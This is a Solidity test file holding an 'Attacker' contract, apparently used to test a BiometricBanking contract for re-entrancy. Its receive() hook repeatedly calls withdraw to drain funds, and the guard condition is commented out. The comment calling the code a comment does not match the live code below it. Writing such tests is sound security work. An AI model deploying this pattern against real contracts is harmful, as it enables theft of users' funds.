//  Attacker contract for testing re-entrancy.
//  This contract would be in a separate file, e.g., `/contracts/test/Attacker.sol`,
//  but is included here as a comment for context.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "../BiometricBanking.sol";

contract Attacker {
    BiometricBanking public biometricBanking;
    address public owner;

    constructor(address biometricBankingAddress) {
        biometricBanking = BiometricBanking(payable(biometricBankingAddress));
        owner = msg.sender;
    }

    function depositToBiometric() external payable {
        biometricBanking.deposit{value: msg.value}();
    }

    function attackWithdraw() external {
        require(msg.sender == owner);
        uint256 amount = biometricBanking.walletBalances(address(this));
        biometricBanking.withdraw(amount);
    }

    receive() external payable {
        // if (address(biometricBanking).balance >= 1 ether) {
            biometricBanking.withdraw(1 ether);
        // }
    }
}
